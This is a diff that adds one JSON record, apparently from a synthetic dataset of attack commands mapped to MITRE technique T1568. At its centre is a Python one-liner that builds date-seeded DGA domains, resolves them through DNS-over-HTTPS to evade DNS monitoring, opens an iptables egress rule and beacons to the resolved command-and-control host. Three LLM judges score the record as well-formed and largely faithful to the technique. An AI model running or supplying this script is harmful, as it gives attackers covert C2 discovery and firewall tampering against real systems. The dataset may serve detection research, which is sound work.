@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1568",
+  "platform": "Linux",
+  "shell": "Python",
+  "command": "python3 -c \"import json,random,datetime,hashlib,subprocess; from scapy.all import IP,UDP,DNS,DNSQR,sr1\nseed='ops-key-2'; tlds=['xyz','com','net']\ndef dga(n):\n    base=str(datetime.datetime.utcnow().strftime('%Y%m%d'))+seed\n    return [hashlib.sha256((base+str(i)).encode()).hexdigest()[:10]+'.'+tlds[i%len(tlds)] for i in range(n)]\ndom=None; ip=None; port=random.choice([10443,23502,18080])\nfor d in dga(25):\n    try:\n        j=subprocess.check_output(['curl','-s','-H','accept: application/dns-json','https://cloudflare-dns.com/dns-query?name='+d+'&type=A'],timeout=5)\n        ans=json.loads(j).get('Answer',[])\n        ip=next((a.get('data') for a in ans if a.get('type')==1),None)\n        if ip:\n            dom=d; break\n    except Exception:\n        pass\nif ip and dom:\n    subprocess.run(['iptables','-I','OUTPUT','-p','tcp','-d',ip,'--dport',str(port),'-j','ACCEPT'])\n    subprocess.run(['curl','-sS','--connect-timeout','3','--resolve',f'{dom}:{port}:{ip}',f'https://{dom}:{port}/status','-k'])\n    print(dom,ip,port)\"",
+  "explanation": "Resolves a DGA domain through DNS-over-HTTPS (DoH) for stealthy dynamic C2 discovery, then restricts egress to the resolved IP and a nonstandard TLS port.",
+  "rationale_steps": [
+    "Generate multiple DGA candidates seeded by date.",
+    "Query DoH JSON API to avoid traditional DNS telemetry and caching.",
+    "Extract first A record and open egress only to that IP/port via iptables.",
+    "Beacon via curl using --resolve to force IP use with correct Host header."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-PYTHON-T1568-c17789a5-4ccc05ea",
+  "source_prompt_hash": "c17789a5",
+  "timestamp_utc": "2025-09-30T09:50:51.932802Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The Python command is perfectly well-formed with balanced quotes, parentheses, and proper syntax for all imported libraries, function definitions, and subprocess calls.",
+        "semantic_score": 5,
+        "semantic_justification": "The command fully implements the T1568 Dynamic Resolution technique by generating domain names algorithmically (DGA), resolving them through DNS-over-HTTPS for stealth, establishing firewall rules for the discovered C2 server, and attempting to connect to it over a randomized non-standard port.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-02T05:52:42.561360Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed python -c script with balanced quoting/newlines, valid Python syntax, and correctly formatted curl and iptables arguments.",
+        "semantic_score": 4,
+        "semantic_justification": "Implements DGA-based dynamic resolution over DoH and attempts C2 access on a rotating nonstandard port, but the egress restriction via iptables likely fails without root and does not enforce restriction without a prior default block.",
+        "combined_score": 4.5,
+        "confidence": 0.86,
+        "timestamp": "2025-10-02T05:53:24.005149Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The Python script is perfectly well-formed with balanced quotes, valid syntax for all constructs, and proper command arguments for subprocess calls.",
+        "semantic_score": 3,
+        "semantic_justification": "While the DGA and DoH resolution perfectly align with the technique, the `iptables` command crucial for \"restricts egress\" requires root privileges, making it operationally implausible under the stated \"Privilege: None\".",
+        "combined_score": 4.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T06:01:07.724534Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.0,
+    "llm_average_score": 4.5,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
